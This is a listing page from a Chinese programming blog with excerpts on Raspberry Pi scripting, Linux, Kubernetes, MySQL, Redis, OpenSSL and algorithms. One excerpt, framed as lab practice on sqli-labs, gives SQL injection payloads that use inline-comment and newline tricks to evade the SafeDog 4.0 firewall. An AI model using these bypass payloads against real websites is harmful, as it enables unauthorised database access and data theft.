<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d83f4f3ae55140f409a98c73b7f28af5/" rel="bookmark">
			基于树莓派的流星雨监测系统（RMS）的进一步改造(2)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何搭建流星雨监测系统，传送门：https://blog.csdn.net/delacroix_xu/article/details/119813807
此篇文章是系列第二篇，第一篇传送门：基于树莓派的流星雨监测系统（RMS）的进一步改造(1)_delacroix_xu的专栏-CSDN博客
背景 近期开始使用一个开源项目，在树莓派4B上玩耍。监测流星雨并存储下来。
https://github.com/CroatianMeteorNetwork/RMS
但该项目有个令人不爽的地方，存储下来的是.bin文件，一种自研的格式，我希望能输出gif或者mp4，方便分享到社交媒体上。
本篇新增功能 输出mp4后，增加钉钉机器人通知，后期再增加上传服务器功能
编写脚本，每日上午8:00运行，找到昨日的目录 ~/RMS_data/CapturedFiles/YESTERDAY_DIR ，执行 python -m Utils.FRbinViewer $dir -e -f mp4 --hide 尝试转换流星监测结果到 mp4视频
然后如果发现了mp4文件，则发出钉钉通知
#!/bin/sh set -ex xxdays=$1 DATE=`date -d "$xxdays days ago" +%Y%m%d` DIRS=`ls ~/RMS_data/CapturedFiles/ | grep ${DATE}` . /home/pi/py37env/bin/activate pwd function sendMsg () { curl -sL 'https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxx' \ -H 'Content-Type: application/json' \ -d '{"msgtype": "text","text": {"content":"'"$1"'"}}' } for DIR in $DIRS; do python -m Utils.FRbinViewer ~/RMS_data/CapturedFiles/${DIR} -e -f mp4 --hide NORMAL=~/RMS_data/CapturedFiles/${DIR}/output-normal.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d83f4f3ae55140f409a98c73b7f28af5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd38c4825adc840a7b97bae1163109dd/" rel="bookmark">
			linux基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 LInux基础 1.Linux目录结构 linux的文件系统是采用级层式的树状目录结构，在此结构中的最上层是根目录“/”，然后在此目录下再创建其他的目录
在linux世界里，一切皆文件
目录介绍：
bin：存放常用的指令
sbin：存到系统管理员使用的系统管理程序
home：存放普通用户的主目录，在linux中每个用户都有一个自己的目录，一般该目录名是以账号命名
root：该目录为系统管理员，也称超级权限者的用户主目录
lib：系统开机所需要的最基本的动态连接共享库
etc：所有的系统管理所需要的配置文件和子目录，例如：mysql.conf
usr：用户很多的应用程序和文件都放在这个目录下
boot：存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件
proc：这个目录是一个虚拟的目录，它是系统内存的映射，访问这个目录来获取系统信息
src：service的缩写，该目录存放一些服务启动之后需要提取的数据
sys：该目录下安装了2.6内核新出现的一个文件系统
tmp：这是一个用来存放一些临时文件的目录
dev：管理设备，把所有硬件用文件的形式存储
media：linux会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会吧识别的设备挂载到这个目录下
mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将外部的存储挂载在/mnt/上，然后进入该目录就可以查看里面的内容了。共享文件夹存放在此处
opt：这是主机额外安装软件所摆放的目录，如安装Oracle数据库就可以放在该目录下。
/usr/local：这是另一个额外给主机安装软件的目录，一般是通过编译源码方式安装的程序
var：这个目录中存放这不断扩充的东西，习惯将经常被修改的目录放在这个目录下，包括各种日志文件
selinux：SELinux是一种安全子系统，它能控制程序只能访问的特定文件
linux的目录中有且只有一个根目录linux的各个目录存放的内容是规划好的，不要乱放文件linux是以文件的形式管理我们的设备，因此linux系统，一切皆为文件
录存放的内容是规划好的，不要乱放文件linux是以文件的形式管理我们的设备，因此linux系统，一切皆为文件linux的各个文件目录下存放什么内容，必须要有一个认识 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf0424a8b99ecfd0f942dcf16c1e4c00/" rel="bookmark">
			需要管理员权限才能删除此文件夹，解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选中文件夹，右键选择‘属性’——‘安全’——组或文件名 ‘编辑’——‘添加’
添加用户名有两种情况：
一：知道要添加的用户名时，可直接在下方图片的位置输入用户名【以administrators为例】——‘检查名称’——得到结果后，点击确定，勾选administrators的权限‘完全控制’，选择‘应用’即可。
二：不清楚自己要添加的用户名时，选择‘高级’——‘立即查找’——根据查找结果选择自己要添加的用户名，双击得到对象名称，点击确定，勾选该用户名的‘完全控制’权限，选择‘应用’即可。
返回目录再次删除文件夹或文件即可成功删除。
若出现‘文件夹或文件已在另一个程序中打开’的问题，可参考这篇文章：https://blog.csdn.net/weixin_44606217/article/details/122165728
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b2c045498110c9e713ebc5622566e04/" rel="bookmark">
			70&#43;个NLP语料库数据集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TED演讲数据集
女性用户网购服装反馈数据集
新闻类别数据集
中华古诗数据集
中文敏感词库
人民日报文章数据集(1979-2010)
人民日报文章数据集(1949-1978)
1998人民日报标注语料库（PFR）
知乎大厂offer热门问题
金融行业问答数据集
知乎拼多多热门问题数据集
英文语句文本数据集
英文歌词数据集
英文作文写作文本数据
中国对联数据集
sentiment140情感分析数据集
2016-2019新闻联播语料库
6000条周杰伦微博超话数据！
新型冠状病毒🦠🦠COVID-19相关标签的推文数据集
【首发】TibetanMNIST藏文手写数字数据集
中文谣言语料库
基金评论数据
COVID-19医学对话数据集
中文对话数据集
word2vec中文词向量数据集
中文百科类问答json版数据集
医学信息提取数据集
社会偏见推断语料库
复旦大学中文文本分类语料库
THUCNews新闻文本分类数据集
7K条携程酒店评论数据
2014人民日报标注语料库（PFR）
网易云精彩评论数据集
2万条中文金融新闻数据集
LCSTS短文本新闻摘要数据库
B站 bilibili流行动漫影评数据
电商女装评论数据集
中文新闻数据集
6万多条中文电商评论数据
社区问答数据集
京东迪奥口红的商品评论数据集
IMDB电影评论数据
微博谣言以及其转发评论
中文姓名语料库
CNN/DailyMail新闻数据集
电影对白数据集（聊天机器人）
《中餐厅3》19W弹幕数据
中文对话情绪语料
网易新闻语料库
百度知道问答数据集
市场资讯新闻数据集
淘宝客服对话数据集
辉瑞新冠🦠疫苗💉推文 数据集
Yelp（美国的大众点评）评论数据集
500万条微博语料
Amazon食品评论数据
维基百科中文语料库
鬼吹灯豆瓣短评数据集
1946年-2003年人民日报 新闻语料库
中文阅读理解数据集
丁香园论坛疫情讨论数据
瑞金医院糖尿病数据集
保险行业语料库
搜狗全网新闻数据(SogouCA)
Reddit上WallStreetBets（WSB）社区帖子数据
8K条保险行业问答中文数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b2c045498110c9e713ebc5622566e04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f0738a940d46c2465043fedceddd7ea/" rel="bookmark">
			K8S 安装 Dashboard
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、在 master 节点执行
本例 k8s 是 v1.17.2，对应的 dashboard 是 v2.0.0-rc5 这个版本，
具体去这里查看对应的版本 Releases · kubernetes/dashboard · GitHub
wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0-rc5/aio/deploy/recommended.yaml # 创建 pod kubectl apply -f recommended.yaml 2、查看，成功创建
[root@master1 ~]# kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE default nginx-5578584966-ch9x4 1/1 Running 1 8h kube-system coredns-9d85f5447-qghnb 1/1 Running 38 6d13h kube-system coredns-9d85f5447-xqsl2 1/1 Running 37 6d13h kube-system etcd-master1 1/1 Running 8 6d13h kube-system kube-apiserver-master1 1/1 Running 9 6d13h kube-system kube-controller-manager-master1 1/1 Running 8 6d13h kube-system kube-flannel-ds-amd64-h2f4w 1/1 Running 5 6d10h kube-system kube-flannel-ds-amd64-z57qk 1/1 Running 1 10h kube-system kube-proxy-4j8pj 1/1 Running 1 10h kube-system kube-proxy-xk7gq 1/1 Running 7 6d13h kube-system kube-scheduler-master1 1/1 Running 9 6d13h kubernetes-dashboard dashboard-metrics-scraper-7b8b58dc8b-5r22j 1/1 Running 0 15m kubernetes-dashboard kubernetes-dashboard-866f987876-gv2qw 1/1 Running 0 15m 3、 删除现有的dashboard服务，dashboard 服务的 namespace 是 kubernetes-dashboard，但是该服务的类型是ClusterIP，不便于我们通过浏览器访问，因此需要改成NodePort型的
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f0738a940d46c2465043fedceddd7ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/306ddd1440ad49f7b5d000a956f9f108/" rel="bookmark">
			sql注入绕过安全狗4.0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.前言2.前置知识3.绕过关键字主要思路3.1绕过连体关键字思路3.2绕过单个关键字思路 4.以sqli-labs(Less-1)为例，绕过安全狗4.1拦截order by4.2拦截union select4.3拦截database()4.4拦截from4.5拦截and4.6查看数据库数据 5.面向安全狗4.0的py脚本6.sqli-labs无安全狗全通关payload 1.前言 该文章只进行技术分享与探讨，任何人进行非法操作与作者无关。
2.前置知识 /*!*/叫做内联注释，当!后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。
比如版本号为5.7.26，当/*!00000xxx*/-/*!50726xxx*/里的注释内容都可以解析为sql语句执行
而&gt;/*!50726xxx*/里的注释内容就真的被注释，失去作用。
3.绕过关键字主要思路 在关键字处使用内联注释和%23%0a（注释换行），内联注释里的版本号即使低于实际版本号有的可以绕过，有的不能绕过（可能是安全狗做了一点小过滤）
所以我们可以使用burpsuite的intruder模块检测一下哪些版本号可以绕过，这里以sqli-labs(Less-1)为例，把版本号设置为payload点
设置payload类型为numbers
然后开始重放
看到两种响应长度，就可以暂停了，有一种一定是能绕过安全狗的版本号
然后下面进行绕过的时候就使用那个能绕过的版本号
3.1绕过连体关键字思路 X代表关键字
X/*/A*/%23%0aX X/*/A*/X X/*/--A----/*/X X/*!66666A*/%23%0aX X/*!44444X*/ X/*!44444%23%0aX*/ /*!44444X/*!44444X*/ 3.2绕过单个关键字思路 X代表关键字
/*!%23%0aX*/ /*!X%23%0a*/ /*!44444X*/ X与前面参数连在一起（不用空格隔开，这个也是绕过方法） 4.以sqli-labs(Less-1)为例，绕过安全狗 4.1拦截order by 1' order/*!%23%0aby*/ 3 %23 1' order/*!*/%23%0aby 3 %23 1' order/*/*/by 3%23 1' order/*//------/*/by 3%23 1' order/*//------/*/%23%0aby 3%23 4.2拦截union select -1' union/*!44444%23%0aselect*/ 1,2,3 %23 -1' union/*!44444%23%0aselect 1,2,3*/ %23 -1' union/*/A/*/select 1,2,3 %23 -1' union/*!66666A*/select 1,2,3 %23 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/306ddd1440ad49f7b5d000a956f9f108/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/141edcb7c54dce623451ee525564fd54/" rel="bookmark">
			LeetCode 56. 合并区间【c&#43;&#43;/java详细题解】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1、题目2、思路3、c++代码4、java代码 1、题目 以数组 intervals 表示若干个区间的集合，其中单个区间为intervals[i] = [starti, endi]。请你合并所有重叠的区间，并返回一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间。
示例 1：
输入：intervals = [[1,3],[2,6],[8,10],[15,18]] 输出：[[1,6],[8,10],[15,18]] 解释：区间 [1,3] 和 [2,6] 重叠, 将它们合并为 [1,6]. 示例 2：
输入：intervals = [[1,4],[4,5]] 输出：[[1,5]] 解释：区间 [1,4] 和 [4,5] 可被视为重叠区间。 提示：
1 &lt;= intervals.length &lt;= 104intervals[i].length == 20 &lt;= starti &lt;= endi &lt;= 104 2、思路 (数组，排序) O ( n l o g n ) O(nlogn) O(nlogn)
1、将所有的区间按照左端点从小到大排序
2、定义区间左端点l = a[0][0]，右端点r = a[0][1]（等价于两个左右指针），我们从前往后遍历每个区间：
如果当前区间和上一个区间没有交集，也就是说当前区间的左端点&gt;上一个区间的右端点，即a[i][0] &gt; r，说明上一个区间独立，我们将上一个区间的左右端点[l,r]加入答案数组中，并更新左端点l，右端点r为当前区间的左右端点，即l = a[i][0], r = a[i][1]。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/141edcb7c54dce623451ee525564fd54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e483d1fea8eb819d65a74c1feb5bb548/" rel="bookmark">
			MySQL介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每日分享：
外向是生活所需，孤独是自我享受。
目录
一、MySQL数据库
1. MySQL数据库的介绍
2. MySQL数据库的安装
二、数据类型和约束
1. 数据类型
2. 数据约束
3. 数据类型附录表
1. 整数类型
2. 字符串
3. 时间类型
一、MySQL数据库 1. MySQL数据库的介绍 MySQL是一个关系型数据库管理系统，是最流行的关系型数据库管理系统中的一个
MySQL的特点：
MySQL是开源的，不需要支付额外的费用MySQL支持大型的数据库，可以处理拥有上千万条记录的大型数据库MySQL使用标准的SQL数据语言形式MySQL可以安装在不同的操作系统，并且提供多种编程语言的操作接口，c、c++、python、Java、Ruby等等 2. MySQL数据库的安装 MySQL数据库服务端软件的安装MySQL数据库客户端软件的安装 在下载之前一般需要使用命令：sudo apt-get update （来更新镜像源，以保证可以下载到最新版）
MySQL数据库服务端软件的安装：
ubuntu中打开终端，输入以下命令：
sudo apt-get install mysql-server
它还会弹出页面让你设置mysql的密码，输入密码按回车即可
如何显示MySQL服务端安装包信息（成功显示证明安装成功）：
apt-cache show mysql-server
查看MySQL服务：
ps -aux | grep mysql
说明：
ps 查看当前系统中的进程-a 表示所有用户-u 表示显示用户名-x 表示显示所有执行程序 查看MySQL服务状态：
sudo service mysql status
running表示运行状态，最后一行按q退出
停止MySQL服务：
sudo service mysql stop
启动MySQL服务：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e483d1fea8eb819d65a74c1feb5bb548/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0399eee5fe48c956b4ffc656a5274750/" rel="bookmark">
			一步步学习黑盒优化算法，借助达摩院MindOpt的RABBO榜单【系列1/4】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 黑盒优化的概念 什么是黑盒优化？「黑盒优化问题」泛指目标函数难以从数学上解析表达，缺少可直接利用的梯度信息，仅可利用目标函数输入和对应输出函数值进行最优解搜索的优化问题。
太抽象，不懂，根据达摩院优化求解器MindOpt团队的教程，它“通过获取不同控制参数(输入变量)对应的系统表现，来推断和搜寻优化解"、“可用于强化学习策略搜索、工业冶炼方案设计、计算资源额度预算优化等”。
云栖大会上王孟昌博士有讲解： https://yunqi.aliyun.com/2021/agenda/session170 在这个直播回放大约20分钟的时候，截图如下：
其中的黑盒优化的架构就像下面的图这样，我们假设我们要求解的问题不好描述，就把这个问题做成一个仿真系统，这个系统可以根据输入的变量值（“候选解”）来给出对应的评价（“观测值”)，然后黑盒优化算法，就是接上这个仿真系统，通过不断地去提供候选解和得到观测值，来搜索可能的最优表现的候选解。
2 黑盒优化benchmark：RABBO 这次达摩院MindOpt优化求解器团队出的「开发者福利」RABBO V1.0看起来挺有意思的，题目集包含4种问题：
从这儿可以看到他们的网页介绍：https://tianchi.aliyun.com/specials/promotion/BlackBox
2.1 瞄一眼长长的文档 点击“查看文档”，会进入个长长的文档，供了解细节。提交评测实际是进的同一个页面，上面有一排tab不要错过，有“排行榜”和“提交结果”。太长，瞄一眼文档结构就行。
2.2 看git项目 点击首页的“下载数据”按钮，和数据列表的“guide.html.zip”文件，都会引导到阿里云家的git（code.aliyun.com），用阿里云的账号登录，第一次用需要根据指引把自己的账号设置好，账号折腾好后，在https://code.aliyun.com/mindopt001/RABBO 可以看到文件截图如下图。
点击“3.27MB”的图标，可以看到文件如下图：
​
2.3 下载它 然后根据自己的喜好下载它。考虑到官方好像在不停更新的样子，我们fork这个项目，在页面上点击“派生”，等待系统完成
这个页面会转很久很久，好像有bug的样纸。 点击左侧导航栏的“项目”就可以看到项目已经有了，地址是
https://code.aliyun.com/你的Username/RABBO，比如我的名字是wuyoy520。可以进项目设置将“可见等级”改成Private。
然后clone克隆到本地自己喜欢的文件夹内。
git clone git@code.aliyun.com:你的Username/RABBO.git clone完了后，根据git指导来安装它，“Note: RABBO supports Python3.6 or newer.” 由于我的python3是分开的指令所以我是这样做的：
cd RABBO pip3 install -r requirements.txt python3 setup.py install pip3 install -e . 运行看结果的主程序示例程序在这儿：
python3 examples/experiment_example.py 最后的运行结果好像是不OK的，没解出来：
​
2.3.1 偷懒的换git账号方法 这里分享一个我切换git账号的偷懒方法：建立一个空的empty项目，然后里面会有Git全局设置参数，复制这两句到终端命令行运行。
3 参考文档，学习RABBO 3.1 RABBO V1.0 问题集 4个问题分别对应文件夹中的不同文件。在目录 blackbox_starter_kit -&gt; problems文件夹下面。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0399eee5fe48c956b4ffc656a5274750/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b911658c2c47e69c854e20581bde025e/" rel="bookmark">
			语义分割网络-STDC_CVPR2021
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 该网络是基于语义分割网络BiSeNetV1版本进行的改进，删掉BiSeNet网络中的双路径方式。属于实时语义分割算法，速度快。
1.2STDC网络的性能 STDC(Short-Term Dense Concatenate network)在Cityscapes上，在1080Ti上
1）STDC1-50网络以250.4FPS的速度在测试集上实现了71.9％的mIoU。
2）STDC2-75网络在97.0FPS的情况下达到76.8％的mIoU。
跟其他算法的性能对比：
2.STDC网络一些细节 2.1STDC与BISeNet网络的结构区别 下图中可以看出STDC网络删除了BISeNet中的spatial path，并使用Detail Guidance结构去代替空间路径的功能。这里先简要提下Detail Guidance，即使用拉普拉斯卷积核生成一个Detail GT图，然后使用Detail GT图与下采样8倍的特征图计算一个辅助Detail Loss。通过这个loss提升网络学习到边缘信息的能力。另外，该loss分支只在训练阶段存在，模型测试阶段推理时是不需要的，因此不会带来推理耗时。
2.2网络概览图 图中，左边那一块有点不直观，其实就是类似于FPN的结构，将stage5、stage4、stage4融合起来。这里手画了一下，不过还是有点不够直观。
2.3 STDC结构(Short-Term Dense Concatenate Module) 多尺度感受野进行concat操作
网络可视化
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0668d163c522f7e5ae1a9fced58bfe8c/" rel="bookmark">
			【Redis】C&#43;&#43;操作Redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++操作Redis redis安装编译hredis安装编译启动redis服务代码示例直接编译运行编写Makefile编译运行 redis安装编译 redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。
git clone https://gitee.com/mirrors/redis.git -b 6.2 cd redis make &amp;&amp; make install hredis安装编译 提供与redis通信（redis通信协议）的API的头文件，动态链接文件(.so)。安装后，头文件位于/usr/local/include/hiredis/。 动态库文件位于 /usr/local/lib/。
git clone https://github.com/redis/hiredis make &amp;&amp; make install 启动redis服务 cd redis redis-server redis.conf 代码示例 test_redis.h
#ifndef _TEST_REDIS_T #define _TEST_REDIS_T #include &lt;iostream&gt; #include &lt;string.h&gt; #include &lt;string&gt; #include &lt;stdio.h&gt; #include &lt;hiredis/hiredis.h&gt; class Redis { public: Redis(){} ~Redis(){ this-&gt;_connect = NULL; this-&gt;_reply = NULL; } bool connect(std::string host, int port) { this-&gt;_connect = redisConnect(host.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0668d163c522f7e5ae1a9fced58bfe8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/846884c575d040fa2c44db23f4fb31b8/" rel="bookmark">
			Mybatis-plus实体类属性与表字段不一致解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 主要注释到实体类上的注解：
@TableName（value = …）
当数据库名与实体类名不一致或不符合驼峰命名时，需要在此注解指定表名
主键自增的设定：
@TableId（type = IdType.AUTO）
指定实体类的属性为对应的主键
@TableField注解
1、 主要用来解决实体类的字段名与数据库中的字段名不匹配的问题（数据库user_addr，字段useraddr未驼峰，mp默认开启驼峰）
2. 实体类中的属性字段在表中不存在的问题
// 用来解决数据库中的字段和实体类的字段不匹配问题 @TableField(value = "age") // 用来解决实体类中有的属性但是数据表中没有的字段 @TableField(exist = false) // 默认为true 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eea690d7f5cfee6a6885a9f0e3e5ba1e/" rel="bookmark">
			OpenSSL之ssl库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ssl OpenSSL的SSL/TLS库，实现了SSL(Secur)/TLS(Transport Layer Security)/DTLS(Datagram Transport Layer Security)协议的多个版本。
SSL_CTX对象包含证书、算法等信息，用于建立TLS/SSL连接。
网络连接建立后可以赋值给SSL对象，然后可以使用SSL对象完成握手操作（SSL_accept或SSL_connect或SSL_do_handshake），握手完成后就可以读写了。关闭网络连接前先调用SSL_shutdown关闭TLS/SSL连接。
SSL_METHOD 特定协议的操作函数，创建SSL_CTX时需要SSL_CIPHER 加密算法信息，可以在SSL_CTX中指定可用的算法集合，SSL_SESSION中会记录实际使用的算法。SSL_CTX 全局配置，包含SSL配置的默认值。SSL_SESSION 包含当前session信息的结构，包括：加密算法、证书、密钥等SSL SSL连接， 使用证书和密钥 #include &lt;openssl/ssl.h&gt; /* CA 设置 */ int SSL_CTX_load_verify_dir(SSL_CTX *ctx, const char *CApath); int SSL_CTX_load_verify_file(SSL_CTX *ctx, const char *CAfile); int SSL_CTX_load_verify_store(SSL_CTX *ctx, const char *CAstore); int SSL_CTX_set_default_verify_paths(SSL_CTX *ctx); int SSL_CTX_set_default_verify_dir(SSL_CTX *ctx); int SSL_CTX_set_default_verify_file(SSL_CTX *ctx); int SSL_CTX_set_default_verify_store(SSL_CTX *ctx); int SSL_CTX_load_verify_locations(SSL_CTX *ctx, const char *CAfile, const char *CApath); /* CA证书相关操作 */ void SSL_CTX_set_client_CA_list(SSL_CTX *ctx, STACK_OF(X509_NAME) *list); void SSL_set_client_CA_list(SSL *s, STACK_OF(X509_NAME) *list); STACK_OF(X509_NAME) *SSL_get_client_CA_list(const SSL *s); STACK_OF(X509_NAME) *SSL_CTX_get_client_CA_list(const SSL_CTX *ctx); int SSL_CTX_add_client_CA(SSL_CTX *ctx, X509 *cacert); int SSL_add_client_CA(SSL *ssl, X509 *cacert); void SSL_CTX_set0_CA_list(SSL_CTX *ctx, STACK_OF(X509_NAME) *name_list); void SSL_set0_CA_list(SSL *s, STACK_OF(X509_NAME) *name_list); const STACK_OF(X509_NAME) *SSL_CTX_get0_CA_list(const SSL_CTX *ctx); const STACK_OF(X509_NAME) *SSL_get0_CA_list(const SSL *s); int SSL_CTX_add1_to_CA_list(SSL_CTX *ctx, const X509 *x); int SSL_add1_to_CA_list(SSL *ssl, const X509 *x); const STACK_OF(X509_NAME) *SSL_get0_peer_CA_list(const SSL *s); /* 证书链设置 */ int SSL_CTX_set0_chain(SSL_CTX *ctx, STACK_OF(X509) *sk); int SSL_CTX_set1_chain(SSL_CTX *ctx, STACK_OF(X509) *sk); int SSL_CTX_add0_chain_cert(SSL_CTX *ctx, X509 *x509); int SSL_CTX_add1_chain_cert(SSL_CTX *ctx, X509 *x509); int SSL_CTX_get0_chain_certs(SSL_CTX *ctx, STACK_OF(X509) **sk); int SSL_CTX_clear_chain_certs(SSL_CTX *ctx); int SSL_set0_chain(SSL *ssl, STACK_OF(X509) *sk); int SSL_set1_chain(SSL *ssl, STACK_OF(X509) *sk); int SSL_add0_chain_cert(SSL *ssl, X509 *x509); int SSL_add1_chain_cert(SSL *ssl, X509 *x509); int SSL_get0_chain_certs(SSL *ssl, STACK_OF(X509) **sk); int SSL_clear_chain_certs(SSL *ssl); int SSL_CTX_build_cert_chain(SSL_CTX *ctx, flags); int SSL_build_cert_chain(SSL *ssl, flags); /* 证书和密钥设置 */ int SSL_CTX_use_certificate(SSL_CTX *ctx, X509 *x); int SSL_CTX_use_certificate_ASN1(SSL_CTX *ctx, int len, const unsigned char *d); int SSL_CTX_use_certificate_file(SSL_CTX *ctx, const char *file, int type); int SSL_use_certificate(SSL *ssl, X509 *x); int SSL_use_certificate_ASN1(SSL *ssl, const unsigned char *d, int len); int SSL_use_certificate_file(SSL *ssl, const char *file, int type); int SSL_CTX_use_certificate_chain_file(SSL_CTX *ctx, const char *file); int SSL_use_certificate_chain_file(SSL *ssl, const char *file); int SSL_CTX_use_PrivateKey(SSL_CTX *ctx, EVP_PKEY *pkey); int SSL_CTX_use_PrivateKey_ASN1(int pk, SSL_CTX *ctx, const unsigned char *d, long len); int SSL_CTX_use_PrivateKey_file(SSL_CTX *ctx, const char *file, int type); int SSL_CTX_use_RSAPrivateKey(SSL_CTX *ctx, RSA *rsa); int SSL_CTX_use_RSAPrivateKey_ASN1(SSL_CTX *ctx, const unsigned char *d, long len); int SSL_CTX_use_RSAPrivateKey_file(SSL_CTX *ctx, const char *file, int type); int SSL_use_PrivateKey(SSL *ssl, EVP_PKEY *pkey); int SSL_use_PrivateKey_ASN1(int pk, SSL *ssl, const unsigned char *d, long len); int SSL_use_PrivateKey_file(SSL *ssl, const char *file, int type); int SSL_use_RSAPrivateKey(SSL *ssl, RSA *rsa); int SSL_use_RSAPrivateKey_ASN1(SSL *ssl, const unsigned char *d, long len); int SSL_use_RSAPrivateKey_file(SSL *ssl, const char *file, int type); int SSL_CTX_check_private_key(const SSL_CTX *ctx); int SSL_check_private_key(const SSL *ssl); int SSL_CTX_use_cert_and_key(SSL_CTX *ctx, X509 *x, EVP_PKEY *pkey, STACK_OF(X509) *chain, int override); int SSL_use_cert_and_key(SSL *ssl, X509 *x, EVP_PKEY *pkey, STACK_OF(X509) *chain, int override); /* 证书选择 */ int SSL_CTX_select_current_cert(SSL_CTX *ctx, X509 *x509); int SSL_select_current_cert(SSL *ssl, X509 *x509); int SSL_CTX_set_current_cert(SSL_CTX *ctx, long op); int SSL_set_current_cert(SSL *ssl, long op); SSL_CTX操作 #include &lt;openssl/ssl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eea690d7f5cfee6a6885a9f0e3e5ba1e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09c6d10a19d2e75b2158fc15c4c6040f/" rel="bookmark">
			一套与有赞连锁模式类似的多门店saas收银系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一套系统搞定门店经营管理全部需求。
这是与有赞连锁模式类似的多门店saas收银系统
直营/加盟/连锁各种业态。可以oem，可以saas付费，可以源码独立部署。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b07113e342789d63abce2fa64c246368/" rel="bookmark">
			【排队论 | 数学建模常用模型】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		排队论的基本概念 问题的提出 如果增添服务设备，就要增加投资或可能发生空闲浪费；如果服务设备太少，排队现象就会严重，对顾客甚至对社会都会发生不利影响。因此，管理人员必须考虑如何在这两者之间取得平
衡，以提高服务质量，降低成本。
